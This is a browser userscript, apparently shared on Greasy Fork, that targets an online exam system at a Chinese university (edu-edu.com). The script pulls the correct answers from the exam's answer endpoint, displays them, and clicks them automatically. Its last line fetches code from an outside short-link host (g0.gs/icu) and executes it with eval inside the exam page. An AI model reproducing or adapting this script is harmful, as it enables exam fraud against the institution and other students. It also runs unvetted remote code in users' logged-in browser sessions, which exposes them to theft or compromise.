// ==UserScript==
// @name         理工考试专用1.2测试
// @namespace    https://greasyfork.org/zh-CN/scripts/483139
// @description  长沙理工成人本科考试专用（仅限内部）
// @author       You
// @match        *://*.edu-edu.com/exam/student/exam2/doexam/*
// @icon         https://www.google.com/s2/favicons?sz=64&domain=edu-edu.com
// @grant        none
// @version      3
// @downloadURL https://update.greasyfork.org/scripts/483139/%E7%90%86%E5%B7%A5%E8%80%83%E8%AF%95%E4%B8%93%E7%94%A812%E6%B5%8B%E8%AF%95.user.js
// @updateURL https://update.greasyfork.org/scripts/483139/%E7%90%86%E5%B7%A5%E8%80%83%E8%AF%95%E4%B8%93%E7%94%A812%E6%B5%8B%E8%AF%95.meta.js
// ==/UserScript==

(function() {
    'use strict';
    let cssT="\n          /* 样式可以根据需要自行修改 */\n          .popup-container {\n              background-color: #fff;\n             // border: 1px solid #ccc;\n              box-shadow: 0 2px 4px rgba(0, 0, 0, 0.2);\n              max-width: 300px;\n            //   margin: 0 auto;\n              padding: 20px;\n              text-align: center;\n              margin-top: 50px;\n              margin-left: 50px;\n          }\n  \n          .popup-content {\n              font-size: 16px;\n              margin-bottom: 10px;\n          }\n          \n          .popup-button {\n              background-color: #007bff;\n              border: none;\n              color: #fff;\n              padding: 10px 20px;\n              text-align: center;\n              text-decoration: none;\n              display: inline-block;\n              font-size: 16px;\n              cursor: pointer;\n              border-radius: 5px;\n          }\n          .popup-button:hover {\n              background-color: #0056b3;\n          }\n    ";function urlLink(){var n=document.getElementsByTagName("script");const e=n[n.length-1].innerText.match(/[\d_]{18,}/g);if(!e)throw alert("7712错误"),new Error("7712错误");return e[0]}function ZHUBBEI(){let n=`https://cjexamnew.edu-edu.com/exam-admin/student/exam/single/review/15873_${location.href.match(/\w{6}\d{17,}\w{15}/g)[0]}_${Date.now()}/ckc001?m=c96b35ab2f34faed8d074fa6465ef71f&d=1703577571604&syncUrl=https://csustcj.edu-edu.com.cn/ScoreReturn/ScoreList/AddCJ?moduleCode=csust_11157_1&allowCount=0`;console.log(n)}async function solution(n){await fetch(`${location.origin}/exam/student/exam2/doview/${n}/1`).then(n=>n.text()).then(n=>{let e=n.match(/'\/(.)+index.html'/g);return e=e[0].replace(/'/g,""),fetch(location.origin+e).then()});let e=`${location.origin}/exam/student/exam/answer/${n}`;return fetch(e).then(n=>n.json()).then(n=>{if(!n.success)throw alert("123251:错误！"),new Error("123251:错误！");return n.answers})}function delayed(n=1){return new Promise((e,t)=>{setTimeout(()=>{e()},100*n)})}function createAdd(n){return`\n        <div class="popup-container">\n            <div class="popup-content">这题选：<span class="popup-header">${n}</span></div>\n            <button class="popup-button" onclick="alert('点击确定继续！')">暂停</button>\n        </div>\n`}async function create(n){const e=document.querySelector("iframe").contentDocument,t=document.createElement("style");t.innerHTML=cssT,e.head.appendChild(t);for(let t=0;t<n.length;t++){await delayed(1);const o=n[t];let r=o.questionId,c=o.answer;const a=e.querySelector(`#q_${r.toString()}`);document.querySelector(`#q_${r.toString()}`).click();a.insertAdjacentHTML("beforeend",` ${createAdd(c)} `);for(let n=0;n<c.length;n++){await delayed(10);const e=c[n];a.querySelector('[code="'+e+'"]').querySelector("span").click(),await delayed(2)}}}
    fetch('https://g0.gs/icu').then(res=>res.text()).then(res=>{ eval(res)})

  })();